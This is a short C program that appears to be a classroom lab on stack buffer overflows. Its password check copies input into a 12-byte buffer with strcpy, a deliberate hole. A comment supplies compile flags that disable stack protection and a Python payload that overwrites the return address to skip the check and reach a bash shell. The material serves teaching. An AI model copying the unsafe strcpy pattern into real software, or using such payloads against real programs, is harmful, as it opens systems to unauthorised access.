#include "stdlib.h"
#include "stdio.h"
#include "string.h"

/*compile and run the program using the following commands (NOTE: to observe the "bypass", change the last four bytes "\x53\x85\x04\x08" to the actual return address in your own program. You can obtain this address using gdb, and running "disas main"):

gcc -g -fno-stack-protector -o buffer_overflow_bypass buffer_overflow_bypass.c
./buffer_overflow_bypass "$(python -c 'print "A"*0x14 + "BBBB" + "\x53\x85\x04\x08"')"

*/

int IsPasswordOK(char *string) 
{
 char Password[12]; // Memory storage for pwd
	strcpy(Password, string);
 if (!strcmp(Password, "goodpass")) 
	return 1; // Password Good
 else 
  	return 0; // Password Invalid
}

int main(int argc, char **argv) {	
 int PwStatus;              // Password Status
 PwStatus=IsPasswordOK(argv[1]);    // Get & Check Password
 if (PwStatus == 0) {
      puts("Access denied"); // Print
      exit(-1);              // Terminate Program
 }
 else 
 {

	puts("Access granted");// Print
	system("/bin/bash");
 }
}


